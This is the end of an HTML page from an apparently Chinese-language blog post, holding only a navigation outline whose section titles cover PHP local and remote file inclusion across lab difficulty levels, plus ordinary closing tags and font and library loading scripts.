<ol>
<li><a href=#php和include>PHP和include</a></li>
<li><a href=#本地文件包含>本地文件包含</a></li>
<li><a href=#远程文件包含>远程文件包含</a></li>
</ol>
</li>
<li><a href=#文件包含>文件包含</a>
<ol>
<li><a href=#信息收集>信息收集</a></li>
<li><a href=#low难度>Low难度</a></li>
<li><a href=#提高难度medium>提高难度：Medium</a></li>
<li><a href=#提高难度high>提高难度：High</a></li>
<li><a href=#帮助文档>帮助文档</a></li>
</ol>
</li>
<li><a href=#总结>总结</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>